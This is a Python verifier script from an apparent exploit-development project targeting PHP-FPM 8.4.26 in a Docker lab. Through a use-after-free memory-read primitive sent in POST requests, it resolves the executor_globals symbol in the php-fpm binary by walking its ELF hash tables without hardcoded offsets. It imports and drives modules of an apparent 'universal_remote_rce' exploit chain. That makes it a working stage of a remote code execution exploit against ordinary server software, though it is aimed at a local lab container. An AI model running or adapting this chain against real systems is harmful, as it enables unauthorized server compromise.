#!/usr/bin/env python3
"""Verifier for symbol_resolver.py on the live a7r5 echo-sink php-fpm 8.4.26 lab.

Proves the documented result: over a POST-to-remote_app.php read backend (the a7
var_hash UAF reflecting read), symbol_resolver walks .gnu_hash/.dynsym/.dynstr
from the php-fpm ELF image base and resolves a symbol OFFSET-FREE -- here
executor_globals -- matching ground truth (binbase + the calibrated EG vaddr).
binbase is seeded from /proc (the remote binbase leak is a separate primitive),
so this isolates the offset-free resolve. seeded-PASS.

Lab bring-up / teardown (committed a7r5 profile, 8.4.26-fpm echo sink, port 8167):
    docker compose -f docker-compose.fpm-avenues.yml -p vgen-sr --profile a7r5 up -d
    python3 -I poc/primitives/read_leak/verify_symbol_resolver.py --project vgen-sr
    docker compose -f docker-compose.fpm-avenues.yml -p vgen-sr --profile a7r5 down
(container p2s-a7r5-fpm; needs docker access for the /proc binbase seed.)
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import socket
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
_ROOT = os.path.dirname(_POC_ROOT)
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import symbol_resolver as S  # noqa: E402  module under test
from common.labharness import proc_binbase  # noqa: E402

COMPOSE = os.path.join(_ROOT, "docker-compose.fpm-avenues.yml")
EG_FPM_OFF = 0x16E22C0   # functable_resolver.EG_OFF["fpm"] (8.4.26-fpm, binbase-rel)


def _load_route():
    path = os.path.join(_POC_ROOT, "chains", "fpm_route.py")
    spec = importlib.util.spec_from_file_location("fpm_route", path)
    m = importlib.util.module_from_spec(spec)
    if os.path.join(_POC_ROOT, "chains") not in sys.path:
        sys.path.insert(0, os.path.join(_POC_ROOT, "chains"))
    spec.loader.exec_module(m)
    return m


def _port_up(host, port):
    try:
        s = socket.create_connection((host, port), timeout=3)
        s.close()
        return True
    except OSError:
        return False


def ensure_lab(compose, project, host, port):
    if _port_up(host, port):
        print("[lab] a7r5 lab already up (:%d)" % port)
        return True
    print("[lab] bringing a7r5 up (-p %s --profile a7r5)" % project)
    subprocess.run(["docker", "compose", "-f", compose, "-p", project,
                    "--profile", "a7r5", "up", "-d"], cwd=_ROOT, capture_output=True)
    for _ in range(60):
        if _port_up(host, port):
            time.sleep(2)
            return True
        time.sleep(1)
    return False


def main(argv=None):
    ap = argparse.ArgumentParser(description="verify symbol_resolver (offset-free)")
    ap.add_argument("--compose-file", default=COMPOSE)
    ap.add_argument("--project", default="p2s-sr")
    ap.add_argument("--container", default="p2s-a7r5-fpm")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8167)
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--down", action="store_true")
    a = ap.parse_args(argv)

    print("=" * 78)
    print("VERIFY symbol_resolver (offset-free gnu_hash resolve over a7 read backend)")
    print("=" * 78)
    if not ensure_lab(a.compose_file, a.project, a.host, a.port):
        print("[FAIL] could not bring the a7r5 lab up")
        return 2

    binbase = proc_binbase(a.container)
    if not binbase:
        print("[FAIL] could not seed binbase from /proc of %s" % a.container)
        return 2
    print("[*] /proc binbase (seed) = %#x" % binbase)

    rce = _load_route()
    # install_fpm_patches wires the a7 read backend + the fpm de-chunking read
    # window onto the engine's resolver (= symbol_resolver.py, loaded inside
    # universal_remote_rce); gnu_hash_resolve then runs symbol_resolver's walk.
    rce.install_fpm_patches(a.host, a.port, a.path, binbase, enum=False)
    if not rce.preflight_reflect(a.host, a.port, a.path):
        print("[FAIL] echo sink preflight failed")
        return 2
    resolver_file = os.path.basename(getattr(rce.remote_rce._resolver, "__file__", ""))
    print("[*] resolver module = %s (symbol_resolver under test: %s)"
          % (resolver_file, resolver_file == os.path.basename(S.__file__)))

    if rce.remote_rce._read_elf_header(binbase) is None:
        print("[FAIL] no ELF header at seeded binbase %#x via the read backend" % binbase)
        return 2

    eg = rce.remote_rce.gnu_hash_resolve(binbase, "executor_globals")
    gt = binbase + EG_FPM_OFF
    ok = eg == gt
    print("[*] gnu_hash executor_globals = %s  GT=%#x  %s  (reads=%d)"
          % (hex(eg) if eg else None, gt, "OK" if ok else "MISMATCH",
             rce.remote_rce.req_count))

    print("-" * 78)
    print("  [%s] offset-free gnu_hash resolve of executor_globals == ground truth"
          % ("PASS" if ok else "FAIL"))
    print("  VERDICT: %s" % ("seeded-PASS" if ok else "FAIL"))

    if a.down:
        subprocess.run(["docker", "compose", "-f", a.compose_file, "-p", a.project,
                        "--profile", "a7r5", "down"], cwd=_ROOT, capture_output=True)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
